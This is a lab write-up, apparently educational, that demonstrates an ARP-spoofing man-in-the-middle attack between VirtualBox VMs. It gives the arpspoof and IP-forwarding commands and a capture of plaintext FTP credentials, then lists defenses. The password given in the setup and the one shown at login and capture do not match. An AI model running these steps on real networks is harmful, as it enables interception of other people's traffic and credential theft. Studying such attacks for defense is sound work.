# ARP Spoofing Attack: Sniffing HTTP & FTP Traffic

## Objective

Simulate a **Man-in-the-Middle (MitM)** attack using **ARP spoofing** to intercept unencrypted traffic (HTTP and FTP) between two victim machines. Observe how credentials and data can be compromised in plain text.

---

## Lab Setup

Three virtual machines on a VirtualBox internal network `192.168.20.0/24`:

| Role       | OS         | IP Address     |
|------------|------------|----------------|
| Attacker   | Kali Linux | 192.168.20.11  |
| Victim #1  | Windows 10 | 192.168.20.10  |
| Victim #2  | Debian     | 192.168.20.12  |

---

## Services

- **Windows 10** is running:
  - FTP server on port `21` (`ftpuser:ftppass`)
  - HTTP server on port `80` (via Python)
- **Debian** will simulate a victim using both services
- **Kali** is the attacker intercepting traffic

---

## Attack Steps

### 1. Enable IP Forwarding on Kali

Allows Kali to forward traffic between spoofed hosts:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
````

---

### 2. Launch ARP Spoofing

Spoof both directions so Kali is in the middle:

```bash
sudo arpspoof -i eth1 -t 192.168.20.10 192.168.20.12  # Windows -> Debian
sudo arpspoof -i eth1 -t 192.168.20.12 192.168.20.10  # Debian -> Windows
```

> Replace `eth1` with your internal adapter’s name.

---

### 3. Start Packet Capture

Run Wireshark on Kali and capture on the `eth1` interface.

* Use display filter: `ftp or http` to isolate plaintext protocols

---

### 4. Simulate Victim Activity (Debian)

#### HTTP

```bash
curl http://192.168.20.10
```

#### FTP

```bash
ftp 192.168.20.10
# Username: ftpuser
# Password: ftp
```

---

## Result: Intercepted Data

Captured on Kali:

* **HTTP traffic** is fully visible (URLs, headers, HTML content)
* **FTP credentials** exposed during login:

  ```
  USER ftpuser
  PASS ftp
  ```

---

## How ARP Spoofing Works

* ARP is a stateless protocol - it trusts any reply
* Kali sends fake ARP replies to victims, saying:

  * "Windows, I'm Debian"
  * "Debian, I'm Windows"
* Both victims update their ARP cache, believing Kali is the other
* All their traffic now routes through Kali
* IP forwarding makes the attack invisible (no connection loss)

---

## Defenses Against ARP Spoofing

* Use **static ARP entries** on critical systems
* Employ **Dynamic ARP Inspection (DAI)** on switches
* Encrypt communication:

  * Use **HTTPS** instead of HTTP
  * Use **SFTP/FTPS** instead of FTP
* Monitor network for:

  * ARP table anomalies
  * Duplicate MAC addresses
  * Suspicious traffic patterns

---

## Summary

This attack demonstrates how easy it is to intercept sensitive data on LANs using ARP spoofing - especially over insecure protocols. Encryption and proper network configuration are key to defending against this class of attack.

```

---
